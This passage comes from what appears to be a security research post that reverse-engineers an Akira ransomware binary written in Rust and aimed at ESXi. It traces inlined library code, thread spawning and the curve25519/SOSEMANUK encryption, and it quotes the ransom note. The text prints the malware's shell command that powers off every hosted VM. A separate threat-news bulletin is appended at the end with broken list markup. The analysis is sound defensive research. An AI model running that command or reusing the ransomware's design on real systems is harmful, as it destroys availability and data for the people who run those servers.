&lt;pre class="EnlighterJSRAW"&gt;pub fn CPU_COUNT_S(size: usize, cpuset: &amp;amp;cpu_set_t) -&gt; c_int {
    let mut s: u32 = 0;
    let size_of_mask = core::mem::size_of_val(&amp;amp;cpuset.bits[0]);

    for i in cpuset.bits[..(size / size_of_mask)].iter() {
        s += i.count_ones();
    }
    s as c_int
&lt;/pre&gt;



&lt;p&gt;Where &lt;code&gt;count_ones()&lt;/code&gt; is a wrapper for an LLVM intrinsic &lt;code&gt;popcnt64&lt;/code&gt;. The assembly it will get expanded to depends on the platform and language — &lt;a href="https://github.com/llvm/llvm-project/blob/521c99627690e09ba25383c83232f94ff457f00c/flang/include/flang/Common/bit-population-count.h#L24"&gt;here&lt;/a&gt; is one Fortran example which contains the same tell-tale constants we observed in the Akira assembly:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;inline constexpr int BitPopulationCount(INT x) { 
  x = (x &amp;amp; 0x5555555555555555) + ((x &gt;&gt; 1) &amp;amp; 0x5555555555555555); 
  x = (x &amp;amp; 0x3333333333333333) + ((x &gt;&gt; 2) &amp;amp; 0x3333333333333333);  
  x = (x &amp;amp; 0x0f0f0f0f0f0f0f0f) + ((x &gt;&gt; 4) &amp;amp; 0x0f0f0f0f0f0f0f0f);  
  x = (x &amp;amp; 0x001f001f001f001f) + ((x &gt;&gt; 8) &amp;amp; 0x001f001f001f001f);  
  x = (x &amp;amp; 0x0000003f0000003f) + ((x &gt;&gt; 16) &amp;amp; 0x0000003f0000003f);
  return (x &amp;amp; 0x7f) + (x &gt;&gt; 32);
}
&lt;/pre&gt;



&lt;p&gt;The (predictable, depressing) explanation for the indecipherable flood of basic blocks that appear in &lt;code&gt;default_action&lt;/code&gt; is that ALL of them are various degrees of inlined library code.&lt;/p&gt;



&lt;p&gt;What we mean by this is that instead of a function call to &lt;code&gt;available_parallelism&lt;/code&gt;, the implementation of that function appears as-is in &lt;code&gt;default_action&lt;/code&gt;. But then, instead of the call to &lt;code&gt;quota&lt;/code&gt; that should appear there, the entire implementation of &lt;code&gt;quota&lt;/code&gt; is spliced into the assembly — except the implementations of &lt;code&gt;quota_v1&lt;/code&gt; and &lt;code&gt;quota_v2&lt;/code&gt; are &lt;em&gt;also&lt;/em&gt; spliced directly into the function instead of called. The same goes for &lt;code&gt;CPU_COUNT&lt;/code&gt;, which gets expanded into its implementation, which is repeatedly calling &lt;code&gt;count_ones&lt;/code&gt; except the loop is unrolled and each single &lt;code&gt;count_ones&lt;/code&gt; is expanded into &lt;em&gt;its&lt;/em&gt; implementation. What this all results in is that the entire complex, tangled upper half of &lt;code&gt;default_action&lt;/code&gt; is &lt;em&gt;five level deep&lt;/em&gt; inlined library code, with the different functions and levels side by side, all downstream from that one single innocuous decision by a malware author to call &lt;code&gt;available_parallelism&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30880" height="230" src="https://research.checkpoint.com/wp-content/uploads/2024/12/legend.png" width="242" /&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-30879" height="951" src="https://research.checkpoint.com/wp-content/uploads/2024/12/default_action_colored.png" style="width: 254px; height: auto;" width="712" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12. Breakdown of &lt;code&gt;default_action&lt;/code&gt; by source of functionality.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;We will see more examples of this theme later, and in fact, between the argument initialization and the call to &lt;code&gt;app.run&lt;/code&gt;, the main function we discussed earlier also contains a large amount of inlined &lt;code&gt;seahorse&lt;/code&gt; code.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Default Action User Code&lt;/h3&gt;



&lt;p&gt;Once all the inlined library code is accounted for, the actual manually authored user code remains. You would expect that the assembly would launch user threads here as per &lt;code&gt;yarnish.rs&lt;/code&gt;, but no. The rest of &lt;code&gt;default_action&lt;/code&gt; is mainly dedicated to checking the values of various user-provided flags and adjusting malware behavior accordingly. One example is checking for the &lt;code&gt;--stopvm&lt;/code&gt; flag; if this is set, the malware forks a new process with the command &lt;code&gt;vim-cmd vmsvc/getallvms | tail -n +2 | awk '{system("vim-cmd vmsvc/power.off " $1)}'&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30881" height="531" src="https://research.checkpoint.com/wp-content/uploads/2024/12/stop_vms.png" style="width: 519px; height: auto;" width="801" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13. Authored code in &lt;code&gt;default_action&lt;/code&gt; turning off all hosted VMs in the ESXi server.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30882" height="53" src="https://research.checkpoint.com/wp-content/uploads/2024/12/stop_vms_cmd.png" width="727" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14. Shell command used to turn off all VMs.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The behavior of the &lt;code&gt;--path&lt;/code&gt; flag is an artifact of how this ransomware was made to target ESXi servers by default, and Linux environments in general only as an additional feature. Its official documentation is:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;--path &amp;lt;string&gt; Start path. Default value: /vmfs/volumes
&lt;/pre&gt;



&lt;p&gt;This means that unless other behavior is specified, the ransomware will attempt to target ESXi VMs specifically. Still, we should stress that this malware has all the required functionality to act as general-purpose Linux ransomware, and this specific focus on ESXi is merely a default.&lt;/p&gt;



&lt;p&gt;Of course, &lt;code&gt;indicatif&lt;/code&gt; is used to its full potential to inform the malware operator of every detail of the current execution status — for example, reporting the &lt;img alt="✨" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2728.png" style="height: 1em;" /&gt;elapsed time:&lt;/p&gt;

&lt;p&gt;Finally, the lock function is called, and the next stage of execution begins.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30901" height="176" src="https://research.checkpoint.com/wp-content/uploads/2024/12/call_lock-1.png" width="344" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19. Call to lock function&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading"&gt;Lock function&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;Thread Spawning&lt;/h3&gt;



&lt;p&gt;As we mentioned before, we have good reason to believe that &lt;code&gt;yarnish.rs&lt;/code&gt; was used as a prototype during the writing of this malware — specifically for this function, &lt;code&gt;lock&lt;/code&gt;, which was moved to a separate module (&lt;code&gt;lock.rs&lt;/code&gt;). The code of &lt;code&gt;yarnish.rs&lt;/code&gt; is reproduced below, redacted for brevity:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;let mut rng = rand::thread_rng();
let started = Instant::now();
let spinner_style = ProgressStyle::with_template("{prefix:.bold.dim} {spinner} {wide_msg}")
    .unwrap()
    .tick_chars("⠁⠂⠄⡀⢀⠠⠐⠈ ");
let m = MultiProgress::new();
let handles: Vec&amp;lt;_&gt; = (0..4u32)
    .map(|i| {
        let count = rng.gen_range(30..80);
        let pb = m.add(ProgressBar::new(count));
        pb.set_style(spinner_style.clone());
        pb.set_prefix(format!("[{}/?]", i + 1));
        thread::spawn(move || {
            let mut rng = rand::thread_rng();
            let pkg = PACKAGES.choose(&amp;amp;mut rng).unwrap();
            for _ in 0..count {
                let cmd = COMMANDS.choose(&amp;amp;mut rng).unwrap();
                thread::sleep(Duration::from_millis(rng.gen_range(25..200)));
                pb.set_message(format!("{pkg}: {cmd}"));
                pb.inc(1);
            }
            pb.finish_with_message("waiting...");
        })
    })
    .collect();
for h in handles {
    let _ = h.join();
}
m.clear().unwrap();
&lt;/pre&gt;



&lt;p&gt;The strings &lt;code&gt;⠁⠂⠄⡀⢀⠠⠐⠈&lt;/code&gt; and &lt;code&gt;{prefix:.bold.dim} {spinner} {wide_msg}&lt;/code&gt; appear as-is in the &lt;code&gt;lock&lt;/code&gt; function, used in the same way as in the source above.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30902" height="418" src="https://research.checkpoint.com/wp-content/uploads/2024/12/indicatif_boilerplate-1.png" style="width: 389px; height: auto;" width="655" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20. Compiled &lt;code&gt;indicatif&lt;/code&gt; boilerplate&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The hardcoded &lt;code&gt;⠁⠂⠄⡀⢀⠠⠐⠈&lt;/code&gt; is spliced directly into the tick_chars implementation by the compiler (instead of the function taking it as an argument as you’d expect from the source):&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30903" height="379" src="https://research.checkpoint.com/wp-content/uploads/2024/12/tick_chars_hardcoded-1.png" style="width: 453px; height: auto;" width="673" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 21. The “function argument” &lt;code&gt;⠁⠂⠄⡀⢀⠠⠐⠈&lt;/code&gt; appears directly in the function body instead of being passed as an argument.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Despite its name, at the assembly level &lt;code&gt;lock&lt;/code&gt; does not itself perform any cryptographic operations; it delegates these to separate threads that it spawns. To get a better grip on how the call to &lt;code&gt;thread::spawn&lt;/code&gt; cashes out in assembly, we go back to the lab setting for a short moment and use a toy program where we control the source:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;use std::thread;
use rand::Rng;

fn main() {
    let _ = thread::spawn(move || {print_rand_char()}).join();
}

fn print_rand_char() {
    let s = "astitchintime";
    let chars: Vec&amp;lt;char&gt; = s.chars().collect();
    let mut rng = rand::thread_rng();
    let idx = rng.gen_range(0..chars.len());
    println!("{}", chars[idx]);
}
&lt;/pre&gt;



&lt;p&gt;Checking the generated assembly, the &lt;code&gt;main&lt;/code&gt; function calls &lt;code&gt;std::thread::spawn&lt;/code&gt;, except (again) a specific key argument is spliced directly into the code instead of given as an argument. This is &lt;code&gt;box_fnonce_vtable&lt;/code&gt; which is directly hardcoded as an argument for &lt;code&gt;std::sys::windows::thread::Thread::new&lt;/code&gt;. The basic block containing the call is highlighted in white.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-30904" height="566" src="https://research.checkpoint.com/wp-content/uploads/2024/12/str_thread_spawn_patched-1-1024x566.png" style="width: 634px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 22. Call to &lt;code&gt;sys::windows::thread::Thread::new&lt;/code&gt;.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;What gets passed in the register &lt;code&gt;r8&lt;/code&gt; is evidently a vtable containing a pointer to a function executed by the thread (we mean this is evident from looking at the assembly, not the variable name &lt;code&gt;box_fnonce_vtable&lt;/code&gt;, which we named after the fact). We could have just included the screenshot and left it there, but it’s more instructive to understand what object is being constructed and operated on here and why, as this pertains to all Rust binaries that use &lt;code&gt;thread::spawn&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;&lt;code&gt;Thread::new&lt;/code&gt;, which does the actual thread-creating, &lt;a href="https://github.com/rust-lang/rust/blob/master/library/std/src/sys/pal/windows/thread.rs#L22"&gt;has the prototype&lt;/a&gt; &lt;code&gt;new(stack: usize, p: Box&amp;lt;dyn FnOnce()&amp;gt;) -&amp;gt; io::Result&amp;lt;Thread&amp;gt;&lt;/code&gt;. Effectively, this means that under the hood, the creation of the new thread is handled using a dynamic dispatch object with a type known at runtime — this is a &lt;code&gt;Box&amp;lt;dyn Trait&amp;gt;&lt;/code&gt;, possibly also known to you as a “struct with a vtable pointer”, and in this case the trait is &lt;code&gt;FnOnce&lt;/code&gt;, meaning the object can call a function. This is nice to know, but it doesn’t answer the question of what underlying type is being used here, and how it is represented in memory byte-wise. To answer that, we need to look at the implementation of &lt;code&gt;spawn&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;This function is implemented using an object called &lt;code&gt;Builder&lt;/code&gt;. The implementation of that object is &lt;a href="https://doc.rust-lang.org/src/std/thread/mod.rs.html#249"&gt;here&lt;/a&gt;:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;pub struct Builder {
    name: Option&amp;lt;String&gt;,
    stack_size: Option&amp;lt;usize&gt;,
}
&lt;/pre&gt;



&lt;p&gt;The function &lt;code&gt;impl spawn for Builder&lt;/code&gt; &lt;a href="https://doc.rust-lang.org/src/std/thread/mod.rs.html#369"&gt;has the prototype&lt;/a&gt;:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;pub fn spawn&amp;lt;F, T&gt;(self, f: F) -&gt; io::Result&amp;lt;JoinHandle&amp;lt;T&gt;&gt;
    where
        F: FnOnce() -&gt; T,
        F: Send + 'static,
        T: Send + 'static,
&lt;/pre&gt;



&lt;p&gt;The argument &lt;code&gt;f&lt;/code&gt; implements &lt;code&gt;FnOnce&lt;/code&gt;; that is what the thread will execute. This argument is wrapped in some padding to create a new function (&lt;code&gt;main&lt;/code&gt;, the ”shim”) that performs some bookkeeping surrounding the launch of the &lt;code&gt;f&lt;/code&gt; logic, and the resulting closure is the object that gets passed to &lt;code&gt;Thread::new&lt;/code&gt; &lt;a href="https://doc.rust-lang.org/src/std/thread/mod.rs.html#512"&gt;here&lt;/a&gt;:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;let main = move || {
            if let Some(name) = their_thread.cname() {
                imp::Thread::set_name(name);
            }

            crate::io::set_output_capture(output_capture);

            let f = f.into_inner();
            set_current(their_thread);
            let try_result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
                crate::sys::backtrace::__rust_begin_short_backtrace(f)
            }));
 ...
 Ok(JoinInner {
            native: unsafe { imp::Thread::new(stack_size, main)? },
            thread: my_thread,
            packet: my_packet,
        })
&lt;/pre&gt;



&lt;p&gt;We can now take a proper look at the assembly implementing the multithreaded ransomware logic. The entire call chain &lt;code&gt;thread::spawn&lt;/code&gt; -&amp;gt; &lt;code&gt;Builder::spawn&lt;/code&gt; -&amp;gt; &lt;code&gt;Builder::spawn_unchecked&lt;/code&gt; -&amp;gt; &lt;code&gt;Builder::spawn_unchecked_&lt;/code&gt; is inlined (highlighted in purple) directly into the &lt;code&gt;lock&lt;/code&gt; function:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30905" height="822" src="https://research.checkpoint.com/wp-content/uploads/2024/12/thread_spawn_inlined-1.png" style="width: 180px; height: auto;" width="244" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 23. &lt;code&gt;Builder::spawn&lt;/code&gt; call chain inlined into user code.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The call to thread::new appears here:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30906" height="882" src="https://research.checkpoint.com/wp-content/uploads/2024/12/thread_new_call_scr-1.png" style="width: 347px; height: auto;" width="553" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 24. Preparation of the &lt;code&gt;Box&amp;lt;dyn FnOnce()&amp;gt;&lt;/code&gt; object leading up to the call to &lt;code&gt;sys::unix::thread::Thread::new&lt;/code&gt;.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The locker thread vtable:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30907" height="91" src="https://research.checkpoint.com/wp-content/uploads/2024/12/akira_lock_vtable_shim-1.png" width="676" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 25. The &lt;code&gt;Box&amp;lt;dyn FnOnce()&amp;gt;&lt;/code&gt; object in memory.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The shim is below (e.g. the call to set_output_capture is visible here):&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30908" height="904" src="https://research.checkpoint.com/wp-content/uploads/2024/12/akira_lock_vtable_shim_contents-1.png" style="width: 459px; height: auto;" width="839" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 26. Completed vtable shim, the source of which we earlier saw (&lt;code&gt;let main = move || …&lt;/code&gt;)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;For the sake of simplicity, we assigned the name &lt;code&gt;call_lock_closure&lt;/code&gt; to the call where the shim invokes &lt;code&gt;sys::backtrace::__rust_begin_short_backtrace&lt;/code&gt; with &lt;code&gt;lock_closure&lt;/code&gt; as a parameter.&lt;/p&gt;



&lt;p&gt;By default, the malware recursively targets encryption files in the directory &lt;code&gt;/vmfs/volumes&lt;/code&gt;. Apart from the &lt;code&gt;--vmonly&lt;/code&gt; flag, the malware offers the operator sophisticated control of exactly what files will be targeted using the &lt;code&gt;--exclude&lt;/code&gt; flag, as detailed in the &lt;code&gt;help&lt;/code&gt; text:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Exclude - skip files by "regular" extension. 
Example: 
--exclude="startfilename(.' *).(.*)" 
using this regular expression will skip all files starting with startfilename and having any extensions. 
Multiple regular' expressions using "|" can also be processed:  
--exclude="(win10-' 3(.*).(.*))|(win10-4(.*).(.*))|(win10-5(.*).(.*))"
&lt;/pre&gt;



&lt;p&gt;Once the thread is launched, the process of encrypting its victim file begins.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;“Lock Closure” &amp;amp; Encryption Logic&lt;/h3&gt;



&lt;p&gt;This is what the authors of this venerable ransomware placed inside &lt;code&gt;thread::spawn(move || { ... })&lt;/code&gt; in their modified &lt;code&gt;yarnish.rs&lt;/code&gt;. Encryption is implemented using a standard hybrid approach of an asymmetric and symmetric cipher. That is, first a per-file symmetric key is generated, and then it is encrypted using the per-binary hardcoded public key. For asymmetric encryption, the malware uses &lt;a href="http://dalek.rs/"&gt;dalek.rs&lt;/a&gt; implementation of &lt;a href="https://en.wikipedia.org/wiki/Curve25519"&gt;curve25519&lt;/a&gt;. The embedded public key, which varies from sample to sample, is found embedded in the binary as a hexadecimal string:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30909" height="552" src="https://research.checkpoint.com/wp-content/uploads/2024/12/curve_publickey-1.png" style="width: 465px; height: auto;" width="763" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 27. Hardcoded curve25519 public key in memory.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;For the symmetric per-file encryption, the malware somewhat unusually uses SOSEMANUK. This stream cipher has &lt;a href="https://www.synacktiv.com/en/publications/pridelocker-a-new-fork-of-babuk-esx-encryptor"&gt;seen some documented malicious use&lt;/a&gt; since at least 2022 in Pridelocker, a fork of Babuk. For this specific cipher, the malware &lt;a href="https://github.com/DaGenix/rust-crypto/blob/master/src/sosemanuk.rs"&gt;uses&lt;/a&gt; the &lt;code&gt;rust-crypto&lt;/code&gt; crate. As a point of interest &lt;code&gt;rust-crypto&lt;/code&gt; has its implementation of encryption using curve25519, separate from that of &lt;code&gt;dalek.rs&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;The use of SOSEMANUK is (again) not unprecedented and documented in other versions of this ransomware. However, we can still clearly visualize the malware author picking this specific cipher and subconsciously snickering, “Heh heh, have fun.” Indeed, with this decision they forced the hand of a heroic soul to &lt;a href="https://github.com/rivitna/Malware/blob/main/Akira/sosemanuk.py"&gt;implement Sosamanuk from scratch in Python&lt;/a&gt; specifically to deal with this ransomware.&lt;/p&gt;



&lt;p&gt;The symmetric session key is generated immediately after the public key is loaded into memory. This is done by calling &lt;code&gt;thread_rng&lt;/code&gt; and obtaining a &lt;code&gt;ThreadRng&lt;/code&gt; &lt;a href="https://rust-random.github.io/rand/rand/rngs/struct.ThreadRng.html"&gt;object&lt;/a&gt;, then calling &lt;code&gt;generate&lt;/code&gt; on its internal &lt;code&gt;ReseedingCore&lt;/code&gt;. The authors would have used the user-facing &lt;code&gt;Rng&lt;/code&gt; &lt;a href="https://rust-random.github.io/rand/rand/trait.Rng.html"&gt;trait&lt;/a&gt;, which offers functions like &lt;code&gt;random&lt;/code&gt; and &lt;code&gt;fill&lt;/code&gt; for this purpose (the underlying layers of logic eventually pass through the PAL and &lt;a href="https://github.com/rust-lang/rust/blob/db034cee00570a9b82ea8b9e9e95221dbd745698/library/std/src/sys/random/linux.rs#L134"&gt;query&lt;/a&gt; &lt;code&gt;/dev/(u)random&lt;/code&gt;); what we see is the inlined internal implementation down to the level of &lt;code&gt;generate&lt;/code&gt; (&lt;a href="https://rust-random.github.io/rand/rand_core/block/trait.BlockRngCore.html#required-methods"&gt;part of&lt;/a&gt; the &lt;code&gt;BlockRngCore&lt;/code&gt; trait).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-30910" height="495" src="https://research.checkpoint.com/wp-content/uploads/2024/12/prng_generate-1-1024x495.png" style="width: 500px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 28. Call to generate downstream from idiotmatic Rust used to generate a random symmetric key; it was inlined up the call chain.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The same is true for the curve25519 and the SOSEMANUK implementations, which appear as-is in the lock closure. We visualize the spliced basic blocks below.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30911" height="955" src="https://research.checkpoint.com/wp-content/uploads/2024/12/lock_closure_color-1.png" style="width: 237px; height: auto;" width="349" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 29. curve25519 code (red) followed by SOSEMANUK code (green), both inlined up the call chain into user code.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Whereas the &lt;code&gt;dalek.rs&lt;/code&gt; implementation of curve25519 leaves some identifiable traces in the form of function calls, the SOSEMANUK implementation is completely in-lined, and the cipher has to be identified using the traditional method of identifying incriminating constants (for example &lt;code&gt;0x54655307&lt;/code&gt;, which when converted to decimal gives the first 10 decimals of pi). The image above only has the tip of the iceberg of the inlined SOSEMANUK implementation; it is one single, gigantic basic block spanning hundreds of instructions. Once the target file is encrypted, the malware appends the extension &lt;code&gt;akiranew&lt;/code&gt;. And, once all files in a target directory have been encrypted, the malware writes a ransom note in that directory to &lt;code&gt;akiranew.txt&lt;/code&gt;, which begins:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Hi friends,
Whatever who you are and what your title is if you're reading this 
it means the internal infrastructure of your company is fully or partially 
dead, all your backups - virtual, physical - everything that we managed to reach - 
are completely removed. Moreover, we have taken a great amount of your 
corporate data prior to encryption. [..]
&lt;/pre&gt;



&lt;p&gt;Tragically, the person reading the above is not likely to appreciate the great effort made by the Rust compiler to bring this result to them &lt;a href="https://doc.rust-lang.org/book/ch16-00-concurrency.html"&gt;with fearless concurrency and in a blazingly fast manner&lt;/a&gt;.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The combination of being cross-platform, having good ergonomics, and the availability of many ready-made libraries have made Rust language a surprisingly strong contender in the malware landscape despite its notoriously steep learning curve. To experiment with Rust, malware authors by necessity have left behind many of their favorite anti-analysis tricks; unfortunately for reverse engineers, the very nature of the language combined with the compiler’s drive to optimize its output can often result in forbidding disassembly that seems to put pressure on the analyst to look at literally anything else. Apart from the counter-intuitive effects of generics and monomorphization (which we have covered in a &lt;a href="https://research.checkpoint.com/2023/rust-binary-analysis-feature-by-feature/"&gt;previous publication&lt;/a&gt;), when analyzing a Rust binary, we need to contend with aggressive in-lining that, as it turns out, can easily reach five levels deep into library code.&lt;/p&gt;



&lt;p&gt;In this publication, we leveraged some favorable conditions and reached a state where we could map the control flow of an actual ITW Rust binary end to end. One of the most crucial tools in our arsenal was the authors’ reliance on ready-made boilerplate code associated with each of the third-party libraries they used. It should go without saying that we won’t always be so lucky and that the already troubled ecosystem of RE plugins and kludges now has an additional gap to bridge. The situation seems to call for automatic tooling that can isolate and identify spliced in-line code, even as it recursively contains other spliced in-line code, and this is a formidable challenge — especially in an environment where analysts didn’t have it down to an exact science 100% of the time identifying pretty, encapsulated functions with well-defined calling conventions, either.&lt;/p&gt;



&lt;p&gt;Still, we hope you gained something from the journey of analyzing an actual ITW Rust binary and sorting through the various hairy internals that get spliced into top level user code, where they have no business being. Once upon a time, reverse-engineering C binaries were also primordial and scary; eventually, understanding improved, tooling caught up, and the task became much less formidable than it once was. We can only reason and hope that even the occasionally painful output of the Rust compiler will meet the same fate — one day in the not extremely far future.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Supply chain software provider Blue Yonder was &lt;a href="https://apnews.com/article/4281388e1b2d196a5fc10fa0c996c7ed"&gt;hit&lt;/a&gt; by a ransomware attack, disrupting services for clients like Starbucks and UK grocery chains Morrisons and Sainsbury&amp;#8217;s. The incident affected operations such as employee scheduling and payroll processing. Blue Yonder is collaborating with cybersecurity firms to recover and has informed affected customers.&lt;/li&gt;
&lt;li&gt;Uganda&amp;#8217;s central bank &lt;a href="https://tribune.com.pk/story/2512852/hackers-steal-17-million-from-ugandas-central-bank-investigation-kicks-off"&gt;experienced&lt;/a&gt; a cyberattack resulting in the unauthorized transfer of approximately 62 billion Ugandan shillings (around $16.8 million). Whilst the state-owned newspaper ‘New Vision’ reported that the attack was carried out by a Southeast Asian hacking group identified as &amp;#8220;Waste&amp;#8221;, who allegedly directed portions of the stolen funds to accounts in Japan, independent sources report that insiders within the bank may have been involved with the hackers. Authorities said they have managed to recover over half of the misappropriated money.&lt;/li&gt;
&lt;li&gt;The city of Hoboken, New Jersey, was &lt;a href="https://therecord.media/hoboken-closes-city-hall-ransomware"&gt;forced&lt;/a&gt; to close its offices temporarily following a ransomware attack. The incident disrupted municipal operations, including public access to essential services. City officials have not confirmed whether any sensitive data was compromised and are working with cybersecurity experts to investigate the breach and restore affected systems.&lt;/li&gt;
&lt;li&gt;Wirral University Teaching Hospital NHS Trust in the UK &lt;a href="https://www.theregister.com/2024/11/28/wirral_nhs_cyber_incident"&gt;faced&lt;/a&gt; a cyberattack that led to IT system outages, forcing staff to use manual processes and causing delays in patient services. Some scheduled procedures were postponed as cybersecurity experts are working to restore operations.&lt;/li&gt;
&lt;li&gt;Great Plains Regional Medical Center in Oklahoma &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/oklahoma-ransomware-attack-hospital"&gt;suffered&lt;/a&gt; a ransomware attack in September, compromising data of over 130,000 individuals. The breach involved personal and medical information, including Social Security numbers. The hospital secured its systems, initiated an investigation with cybersecurity experts, and began notifying affected patients.&lt;/li&gt;
&lt;li&gt;International Game Technology (IGT), a global gaming technology provider, &lt;a href="https://finance.yahoo.com/news/gambling-tech-vendor-systems-impacted-083000871.html"&gt;experienced&lt;/a&gt; a cyberattack. The company took certain systems offline to protect its network and is working with cybersecurity experts to investigate and restore affected services.&lt;/li&gt;
&lt;li&gt;Italian football club Bologna FC &lt;a href="https://www.bleepingcomputer.com/news/security/bologna-fc-confirms-data-breach-after-ransomhub-ransomware-attack/"&gt;confirmed&lt;/a&gt; a ransomware attack, claimed by the RansomHub group, resulting in the theft of company sponsorship contracts and personal information of players and staff. The RansomHub group threatened that it will publish all medical, personal and confidential data of the club’s players, as the club’s management presumably refused to pay the ransom fee.&lt;/li&gt;

&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Researchers have &lt;a href="https://vulncheck.com/blog/projectsend-exploited-itw"&gt;detected&lt;/a&gt; active exploitation of a critical vulnerability in the file-sharing application ProjectSend (CVE-2024-11680). This flaw allows attackers remote and unauthenticated access to modify configurations, create accounts, upload webshells and embed malicious JavaScript. While a patch for the vulnerability has been available for a year, 99% of ProjectSend instances have not been patched, and are now being exploited.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(ProjectSend Authentication Bypass (CVE-2024-11680))&lt;/em&gt;&lt;/p&gt;

&lt;li&gt;WordFence &lt;a href="https://securityonline.info/cve-2024-8672-critical-flaw-in-widget-options-plugin-threatens-100000-websites/"&gt;identified&lt;/a&gt; a critical vulnerability (CVE-2024-8672) in the WordPress Widget Options plugin, affecting over 100,000 websites. This flaw allows contributors with access to execute arbitrary code via poorly filtered inputs in the plugin&amp;#8217;s display logic feature. The vulnerability was patched in the recent update.&lt;/li&gt;
